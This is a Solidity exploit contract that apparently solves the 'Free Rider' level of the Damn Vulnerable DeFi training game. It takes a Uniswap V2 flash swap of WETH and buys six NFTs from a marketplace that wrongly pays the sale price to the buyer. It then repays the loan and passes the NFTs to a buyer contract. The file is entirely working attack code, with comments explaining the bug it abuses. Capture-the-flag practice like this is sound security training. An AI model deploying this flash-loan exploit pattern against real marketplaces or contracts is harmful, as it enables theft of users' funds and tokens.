// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "hardhat/console.sol";

interface IWETH9 {
    function withdraw(uint amount0) external;

    function deposit() external payable;

    function transfer(address dst, uint wad) external returns (bool);

    function balanceOf(address addr) external returns (uint);
}

contract FreeRiderAttack is IUniswapV2Callee {
    FreeRiderNFTMarketplace market;
    FreeRiderBuyer buyer;
    DamnValuableNFT public nft;
    IWETH9 weth;
    address uniswapPair;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address payable _market,
        address _buyer,
        address _nft,
        address _weth,
        address _uniswapPair
    ) {
        market = FreeRiderNFTMarketplace(_market);
        buyer = FreeRiderBuyer(_buyer);
        nft = DamnValuableNFT(_nft);
        weth = IWETH9(_weth);
        uniswapPair = _uniswapPair;
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack(uint256 amount) external payable {
        //get a flash swap (loan)
        IUniswapV2Pair(uniswapPair).swap(
            amount,
            0,
            address(this),
            new bytes(1)
        );
    }

    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata
    ) external override {
        // exchange the loaned weth to eth
        weth.withdraw(amount0);

        // buy NFT
        // FreeRiderNFTMarketplace line 80: it transfer price of NFT back to new owner
        market.buyMany{value: 15 ether}(tokenIds);

        weth.deposit{value: address(this).balance}();

        // pay back the flash loan with 0.3% LP Fee
        weth.transfer(address(uniswapPair), (15 ether * 10031) / 10000);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }
    }
}
